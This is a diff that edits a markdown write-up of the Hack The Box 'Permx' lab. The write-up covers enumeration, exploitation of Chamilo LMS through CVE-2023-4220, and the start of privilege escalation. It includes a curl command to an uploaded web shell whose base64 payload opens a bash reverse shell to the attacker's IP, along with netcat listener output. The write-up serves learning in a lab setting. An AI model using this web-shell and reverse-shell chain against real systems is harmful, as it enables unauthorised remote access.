@@ -2,13 +2,14 @@
 
 ## Introduction
 
-In this write-up, we detail the steps taken to compromise the "Permx" Capture The Flag (CTF) challenge. This CTF involves multiple stages, including enumeration, vulnerability exploitation, privilege escalation, and root access. Each step is documented with the commands used, the vulnerabilities identified, and the techniques employed to gain control of the target machine.
+In this write-up, we detail the steps taken to compromise the "Permx" box from htb, the lab was straightforward and very beginner friendly ,this is a writeup of how i exploited it
 
 ### Target Overview
 
 - **Box Name:** Permx
+- **Difficulty** Easy
 - **IP Address:** 10.10.11.23
-- **Description:** [Brief description of the box, if available]
+-
 
 This write-up is intended for educational purposes and to provide insight into the methodology used during the penetration testing process.
 
@@ -71,6 +72,8 @@ Starting gobuster in directory enumeration mode
 /js                   (Status: 301) [Size: 303] [--> http://permx.htb/js/]
 /404.html             (Status: 200) [Size: 10428]
 ```
+going through the pages of permx.htb and proxying the traffic through burpsuite i didnt find any vulnerabilty i could exploit so moving ahead to subdomain enumeration
+
 ### Subdomain Enumeration with Wfuzz
 
 For subdomain enumeration, I used Wfuzz to brute-force potential subdomains. This helped to find hidden or less obvious parts of the application that might be running on different subdomains.
@@ -98,14 +101,18 @@ Filtered Requests: 4987
 Requests/sec.: 49.77654
 ---
 ```
+
+we were able to discover 2 submaoins www and lms, the only thing we need is lms
 #### Adding Subdomain and Initial Exploitation
 
  Adding `lms.permx.htb` to Hosts File
 
 First, I added the subdomain `lms.permx.htb` to my hosts file to access the application running on that subdomain.
 After adding the subdomain, I navigated to http://lms.permx.htb and found a login form for Chamilo LMS.
-[picture]
-I tried default credentials and tested for SQL injection vulnerabilities, but didn’t have much luck. I then searched online for known exploits for Chamilo LMS.
+![login chamilo](https://github.com/user-attachments/assets/181022bc-32a2-4e83-bd0d-6a5d9fb8bd6f)
+
+
+I tried default credentials and tested for SQL injection/ other vulnerabilities, but didn’t have much luck. I then searched online for known exploits for Chamilo LMS.
 
 Unable to get the version number, I decided to try various exploits that I found. Eventually, I came across an exploit that worked:
 #### Vulnerability Overview: CVE-2023-4220
@@ -130,6 +137,7 @@ The script requires the target URL with Chamilo's root path (e.g., `http://examp
 python3 poc.py -u http://lms.permx.htb -a scan
 [+] Target is likely vulnerable. Go ahead. [+]
 ```
+i got a positive response indicating the webapp might be vulnerable
 ## Exploiting the Vulnerability
 
 Since the web service was found to be vulnerable, I proceeded to exploit it by creating a web shell.
@@ -155,9 +163,9 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 ### Obtaining a Reverse Shell
 
-To gain access to the system, I used the newly created web shell to execute a reverse shell payload.
+To gain access to the system, I used the ncreated web shell to execute a reverse shell payload.
 
-1. **Execute the Payload**: I crafted a `curl` command to send a base64-encoded payload to the web shell. The payload was decoded and executed via the web shell, which initiated a reverse shell connection. The command used was:
+1. **Execute the Payload**: I crafted a `curl` command to send a base64-encoded payload to the web shell. The payload was decoded and executed via the web shell. The command used was:
    ```bash
    curl "http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/bam.php?cmd=echo+'YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yOS80NDQ0IDA%2bJjE%3d'+|base64+-d+|bash"
 edit the base64 payload to your own ip adress
@@ -194,10 +202,11 @@ zsh: suspended  nc -lnvp 4444
 www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ 
 ```
 now we have a fully interactive shell
+i being enumeration for privesc
 
 ---
 after manually browsing through config files looking for creds or any other information i can leverage i decided it's time to download 
-'linpeash.sh' ontop the box
+'linpeash.sh' onto the box
 ### Downloading linpeas.sh Using a Python Web Server
 
 To transfer `linpeas.sh` from my local PC to the target machine, I used a Python web server. Here are the steps I followed:
